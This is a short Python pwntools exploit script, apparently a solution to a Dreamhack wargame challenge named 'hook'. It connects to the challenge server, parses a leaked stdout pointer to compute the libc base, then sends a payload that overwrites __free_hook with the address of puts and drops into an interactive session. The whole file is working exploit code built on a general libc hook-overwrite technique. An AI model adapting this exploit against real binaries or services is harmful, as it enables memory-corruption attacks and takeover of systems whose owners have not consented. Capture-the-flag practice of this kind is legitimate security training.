from pwn import *
def slog(n, m): return success(": ".join([n, hex(m)]))

context.log_level = 'debug'

p = remote("host1.dreamhack.games", 20233)
# p = process("./hook")
# libc = ELF("/lib/x86_64-linux-gnu/libc-2.31.so")
libc = ELF("./libc.so.6") #libc-2.23
# gdb.attach(p)

# [1] Get information about buf
p.recvuntil(b"stdout: ")
tmp=p.recvline() #64bit

print(tmp[:-1])
stdout = int(tmp[:-1], 16)

slog("stdout", stdout)
libc_base = stdout - libc.symbols["_IO_2_1_stdout_"]
free_hook_addr = libc_base + libc.symbols["__free_hook"]
puts_addr = libc_base + libc.symbols["puts"]

p.recvuntil(b"Size: ")
p.sendline(str(16))

# [2] Get libc_base
p.recvuntil(b"Data: ")
payload = p64(free_hook_addr)+p64(puts_addr)
p.sendline(payload) #sendline is have \n

p.recvline()
p.interactive()